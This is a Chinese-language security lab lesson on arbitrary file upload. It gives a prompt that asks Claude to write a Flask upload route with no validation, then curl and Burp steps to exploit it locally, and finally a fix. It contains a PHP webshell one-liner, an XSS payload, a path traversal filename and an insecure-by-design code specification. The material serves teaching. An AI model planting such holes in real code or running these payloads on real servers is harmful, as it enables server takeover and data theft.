# Day 4 - 任意文件上传漏洞

---

## 一、发给 Claude 的提示词

把以下内容完整复制粘贴到 claude.ai 对话框中：

```
请在上次已有的登录、注册、搜索功能基础上，继续增加用户头像上传功能。保持原有功能不变。

### 在 app.py 中新增以下内容：

1. 新增路由 /upload，支持 GET 和 POST：
   - 需要登录才能访问（未登录时跳转到登录页）
   - GET 请求显示上传页面 upload.html
   - POST 请求接收用户上传的文件
   - 文件保存到 static/uploads/ 目录
   - 保存时使用用户上传的原始文件名，不要重命名
   - 上传成功后返回文件的访问 URL，并在页面显示图片预览
   - 不要检查文件后缀或文件内容类型

### 新增 templates/upload.html

上传页面，继承 base.html，包含：
- 文件选择输入框
- 上传按钮
- 上传成功后显示图片预览和文件链接
- 上传失败时显示错误提示

### 在 app.py 中新增配置

- 设置 MAX_CONTENT_LENGTH = 16MB

### 修改 templates/base.html

- 在导航栏登录后的菜单中添加"上传头像"链接

### 修改 templates/index.html

- 在已登录状态下的欢迎页面中添加"上传头像"的快捷入口

### 新增 static/uploads/ 目录

- 在项目根目录下创建 static/uploads/ 文件夹

### 代码规范要求
- 不要对上传的文件做任何类型检查（不检查后缀名、不检查 MIME 类型）
- 使用用户提供的原始文件名保存（不要用 UUID 或时间戳重命名）
- 不需要调用任何文件校验函数

生成全部代码后告诉我，我复制覆盖到本地项目中。
```

---

## 二、学生操作步骤

| 步骤 | 操作 | 说明 |
|------|------|------|
| 1 | 复制上面提示词发给 Claude | 在上次功能基础上增加文件上传 |
| 2 | Claude 生成后，覆盖 app.py、templates/upload.html | 保持原有功能不变 |
| 3 | 在项目中创建 static/uploads/ 目录 | 如果没有自动创建的话 |
| 4 | 终端运行 `python app.py` | 启动项目 |
| 5 | 用 curl 测试上传任意文件 | 见下方 POC |
| 6 | 分析代码，编写修复到 fix/file_handler_fix.py | 修复漏洞 |
| 7 | `git add -A && git commit -m "day-04: 文件上传 + 任意上传修复"` | 提交成果 |

---

## 三、漏洞原理

### 漏洞 1：无服务端文件类型校验

```python
# 提示词明确要求："不要检查文件后缀或文件内容类型"
# Claude 生成的代码不会调用任何文件类型校验函数
```

服务器接收文件后，直接保存而不检查文件扩展名或 MIME 类型。攻击者可以上传 .py、.php、.exe 等可执行文件。

### 漏洞 2：原始文件名保存

```python
filename = file.filename  # 直接使用用户提供的文件名
file.save(os.path.join(upload_folder, filename))
```

不使用 UUID 或时间戳重命名，攻击者可以精确预测文件在服务器上的路径。同时可能造成路径穿越攻击。

### 漏洞 3：上传目录可直接访问

```python
file_url = f"/static/uploads/{filename}"
```

`/static/uploads/` 目录是 Flask 静态文件目录，所有文件无需认证即可通过 URL 直接访问。

---

## 四、POC 代码

### POC 1：上传 txt 文件

```bash
# 先登录获取 session
curl http://127.0.0.1:5000/login -d "username=admin&password=admin123" -c /tmp/cookies.txt

# 上传 txt 文件
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@-;filename=test.txt" <<< "hello world"
```

**预期输出**：提示"成功"。

### POC 2：上传 py 文件（模拟 webshell）

```bash
# 上传 Python 文件
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@-;filename=shell.py" <<< 'import os; print("pwned")'
```

**预期输出**：提示"成功"，说明没有做文件类型限制。

### POC 3：直接访问上传的文件

```bash
# 访问上传的 py 文件
curl http://127.0.0.1:5000/static/uploads/shell.py
```

**预期输出**：显示文件内容，说明上传目录可直接访问。

### POC 4：批量上传测试

```bash
# 尝试上传不同类型的文件
echo '<?php system($_GET["cmd"]);?>' > /tmp/webshell.php
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/webshell.php"

echo '<script>alert("xss")</script>' > /tmp/malicious.html
curl http://127.0.0.1:5000/upload -b /tmp/cookies.txt -F "file=@/tmp/malicious.html"
```

---

## 五、Burp Suite 测试方法

1. 登录后访问上传页面，选择一个图片文件上传
2. 在 Burp 中拦截 POST /upload 请求
3. 修改请求中的 `filename="image.png"` 为 `filename="shell.php"`
4. 修改文件内容为 PHP webshell 代码
5. 放行请求
6. 访问 `http://127.0.0.1:5000/static/uploads/shell.php` 确认可以访问

---

## 六、POC 代码详细解释

### POC 2 详解：上传流程

```
用户请求 POST /upload → 携带文件 shell.py

服务器收到请求：
1. 检查用户是否登录（有 Cookie）→ 通过
2. 获取上传的文件对象 → file.filename = "shell.py"
3. 拼接保存路径 → static/uploads/shell.py
4. 保存文件 → file.save("static/uploads/shell.py")
5. 返回 URL → /static/uploads/shell.py
                    ↑
               没有检查 .py 后缀！没有检查文件内容！

攻击者访问 /static/uploads/shell.py：
  → Flask 返回文件内容
  → 如果该文件是可执行脚本，服务器可能执行它
```

### 漏洞组合利用

```
上传 webshell → 获取服务器权限 → 读取 /etc/passwd
上传恶意脚本 → XSS 攻击 → 窃取用户 Cookie
上传 HTML 文件 → 钓鱼页面 → 骗取其他用户密码
```

---

## 七、修复方案

创建 `fix/file_handler_fix.py`：

```python
import os
import uuid

UPLOAD_FOLDER = "static/uploads"
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    """检查文件后缀是否允许"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def handle_upload_fixed(file):
    """修复：校验文件类型 + 重命名文件"""
    if not file or file.filename == '':
        return None, "未选择文件"

    # 修复 1：检查文件后缀
    if not allowed_file(file.filename):
        return None, "文件类型不允许"

    # 修复 2：使用 UUID 重命名
    ext = file.filename.rsplit('.', 1)[1].lower()
    new_filename = f"{uuid.uuid4().hex}.{ext}"

    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
    save_path = os.path.join(UPLOAD_FOLDER, new_filename)
    file.save(save_path)

    file_url = f"/static/uploads/{new_filename}"
    return file_url, "上传成功"
```

然后在 app.py 的 upload 路由中引入修复版本。

---

## 八、漏洞复现检查清单

| # | 检查项 | curl 命令 | 预期结果 |
|---|--------|----------|---------|
| 1 | 上传txt文件 | `curl ... -F "file=@-;filename=test.txt"` | 提示成功 |
| 2 | 上传py文件 | `curl ... -F "file=@-;filename=shell.py"` | 提示成功 |
| 3 | 直接访问 | `curl http://.../shell.py` | 返回文件内容 |
| 4 | 上传php文件 | `curl ... -F "file=@-;filename=shell.php"` | 提示成功 |

---

## 九、课后任务

1. 用 curl 上传 .py、.php、.html 文件到服务器
2. 验证这些文件是否可以通过 URL 直接访问
3. 思考：如果上传的是一个 Flask 路由文件会怎样？
4. 在 fix/ 目录下编写修复代码，实现白名单校验
5. 验证修复后 .py 文件上传被拒绝，.jpg 等仍可正常上传
6. （进阶）尝试路径穿越攻击：`filename=../../etc/shell.py`
7. 提交到自己的个人分支
